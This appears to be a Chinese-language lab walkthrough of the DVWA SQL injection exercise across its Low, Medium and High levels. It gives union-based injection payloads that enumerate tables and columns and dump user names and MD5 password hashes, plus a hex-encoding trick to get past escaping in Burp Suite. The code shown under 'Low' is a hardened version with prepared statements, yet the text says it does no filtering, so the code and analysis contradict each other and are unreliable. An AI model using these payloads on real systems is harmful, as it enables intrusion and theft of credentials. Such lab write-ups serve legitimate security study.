# Low

## 审计代码

    
    
    <?php
    
    if( isset( $_GET[ 'Submit' ] ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    
        // Get input
        $id = $_GET[ 'id' ];
    
        // Was a number entered?
        if(is_numeric( $id )) {
            $id = intval ($id);
            switch ($_DVWA['SQLI_DB']) {
                case MYSQL:
                    // Check the database
                    $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
                    $data->bindParam( ':id', $id, PDO::PARAM_INT );
                    $data->execute();
                    $row = $data->fetch();
    
                    // Make sure only 1 result is returned
                    if( $data->rowCount() == 1 ) {
                        // Get values
                        $first = $row[ 'first_name' ];
                        $last  = $row[ 'last_name' ];
    
                        // Feedback for end user
                        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                    }
                    break;
                case SQLITE:
                    global $sqlite_db_connection;
    
                    $stmt = $sqlite_db_connection->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );
                    $stmt->bindValue(':id',$id,SQLITE3_INTEGER);
                    $result = $stmt->execute();
                    $result->finalize();
                    if ($result !== false) {
                        // There is no way to get the number of rows returned
                        // This checks the number of columns (not rows) just
                        // as a precaution, but it won't stop someone dumping
                        // multiple rows and viewing them one at a time.
    
                        $num_columns = $result->numColumns();
                        if ($num_columns == 2) {
                            $row = $result->fetchArray();
    
                            // Get values
                            $first = $row[ 'first_name' ];
                            $last  = $row[ 'last_name' ];
    
                            // Feedback for end user
                            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                        }
                    }
    
                    break;
            }
        }
    }
    
    // Generate Anti-CSRF token
    generateSessionToken();
    
    ?> 
    ## 分析源码，可以看到没有对参数做任何的过滤

## 判断是否存在SQL注入

### 1\. 输入1 提交

![](https://image.3001.net/images/20230809/1691547300_64d2f6a407221cdffdfca.png!small)

### 2\. 输入1' 提交

![](https://image.3001.net/images/20230809/1691547328_64d2f6c009caee5fe420a.png!small)

### 3\. 输入 1 and
1=1提交![](https://image.3001.net/images/20230809/1691547355_64d2f6db5c117663ba45e.png!small)

### 4\. 输入1 and 1=2提交

![](https://image.3001.net/images/20230809/1691547378_64d2f6f2a81b78878ba91.png!small)

由上可以看出是存在注入点的，并且是以单引号闭合的，我们猜测sql查询语句是这样的：

    
    
    select First name的列名 and Surname的列名 from 表名 where id的列名 ='我们输入的id'

## 判断列数

### 1\. 1' order by 2#

![](https://image.3001.net/images/20230809/1691547416_64d2f71846913d240a4a0.png!small)

### 2\. 1' order by 3#

确定显示的位置（SQL语句查询之后的回显位置）

![](https://image.3001.net/images/20230809/1691547439_64d2f72fee64ccef38fdd.png!small)

## Union注入

### 1\. 查看回显

    
    
    1' union select 1,2#

1' 联合选择 1，2# #从下图可以看出有2个回显

![](https://image.3001.net/images/20230809/1691547464_64d2f7489b033403cfa7d.png!small)

### 2\. 查询当前的数据库，以及版本

    
    
    1' union select version(),database()#

![](https://image.3001.net/images/20230809/1691547511_64d2f7771990454a1af55.png!small)

### 3\. 获取数据库中的表

    
    
    -1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
    
    -1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#

![](https://image.3001.net/images/20230809/1691547558_64d2f7a6c040c722ba101.png!small)

![](https://image.3001.net/images/20230809/1691547578_64d2f7ba2109fa5410228.png!small)

### 知识点：

1.在MYSQL5.0以上版本中存在自带数据库information_schema，他是一个存储所有数据库名，表明，列名的数据库，相当于可以通过查询此库获得相应信息。（没有的话只能靠猜，暴力破解）

    
    
    -1' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'#

![](https://image.3001.net/images/20230809/1691547603_64d2f7d3323af7c3eb108.png!small)

### 4\. 获取表中字段名

    
    
    1' union select  1, group_concat(column_name) from information_schema.columns where table_name='users'#

![](https://image.3001.net/images/20230809/1691547633_64d2f7f1006222d5075e3.png!small)

### 5\. 获取字段中的数据

    
    
    1' union select user, password from users#

![](https://image.3001.net/images/20230809/1691547660_64d2f80ccc030eaba6d86.png!small)

  

这里密码使用了MD5加密，可在 <https://www.cmd5.com/>进行解密

# Medium

## 审计代码

    
    
    <?php
    
    if( isset( $_POST[ 'Submit' ] ) ) {
        // Get input
        $id = $_POST[ 'id' ];
    
        $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
    
        switch ($_DVWA['SQLI_DB']) {
            case MYSQL:
                $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
                $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
    
                // Get results
                while( $row = mysqli_fetch_assoc( $result ) ) {
                    // Display values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];
    
                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
                break;
            case SQLITE:
                global $sqlite_db_connection;
    
                $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
                #print $query;
                try {
                    $results = $sqlite_db_connection->query($query);
                } catch (Exception $e) {
                    echo 'Caught exception: ' . $e->getMessage();
                    exit();
                }
    
                if ($results) {
                    while ($row = $results->fetchArray()) {
                        // Get values
                        $first = $row["first_name"];
                        $last  = $row["last_name"];
    
                        // Feedback for end user
                        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                    }
                } else {
                    echo "Error in fetch ".$sqlite_db->lastErrorMsg();
                }
                break;
        }
    }
    
    // This is used later on in the index.php page
    // Setting it here so we can close the database connection in here like in the rest of the source scripts
    $query  = "SELECT COUNT(*) FROM users;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    $number_of_rows = mysqli_fetch_row( $result )[0];
    
    mysqli_close($GLOBALS["___mysqli_ston"]);
    ?> 
    ## 分析源码可以看到对参数使用mysql_real_escape_string函数转义sql语句，
    我们可以利用burp修改数据包，绕过防御。判断注入点，以及注入的类型

## 攻击复现

### 使用burp抓取

![](https://image.3001.net/images/20230809/1691547747_64d2f8636e575c4d17756.png!small)

### 我们转到Repeater进行操作

![](https://image.3001.net/images/20230809/1691547773_64d2f87d2a73d3d1f6ac8.png!small)

 **根据low关卡知道存在SQL注入，这里就不多演示，我们从爆数据库开始**

### 1\. 查询当前的数据库，以及版本

    
    
    union select version(),database()#

![](https://image.3001.net/images/20230809/1691547906_64d2f902e2df2fbdfcc0f.png!small)

![](https://image.3001.net/images/20230809/1691547915_64d2f90bd522df791d27f.png!small)

### 2\. 获取数据库中的表

    
    
    union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#

![](https://image.3001.net/images/20230809/1691547948_64d2f92c518864a495e2a.png!small)

![](https://image.3001.net/images/20230809/1691547956_64d2f934ef3342141647f.png!small)

###  **3\. 获取表中的字段名，考虑到单引号被转义，可以利用16进制绕过。（“用户”）**

    
    
    union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273#

![](https://image.3001.net/images/20230809/1691547988_64d2f95413bb8ee12c743.png!small)

![](https://image.3001.net/images/20230809/1691547996_64d2f95cd0926ba20a0e9.png!small)

### 获取字段中的数据

    
    
    union select user,password from users##

![](https://image.3001.net/images/20230809/1691548037_64d2f985a4ab5e7f38b0d.png!small)

![](https://image.3001.net/images/20230809/1691548046_64d2f98ec3f86a7fc49f0.png!small)

# High

可以看出，点击“here to change your
ID”，页面自动跳转，防御了自动化的SQL注入，分析源码可以看到，对参数没有做防御，在sql查询语句中限制啦查询条数，可以通过burpsuit抓包，修改数据包实现绕过。

方法跟前面的差不多，这里就不多演示了，直接爆账号密码

## 获取账号密码

![](https://image.3001.net/images/20230809/1691548089_64d2f9b9445e57f7b124e.png!small)

# 使用的工具

BurpSuite

phpstudy_pro

火狐浏览器

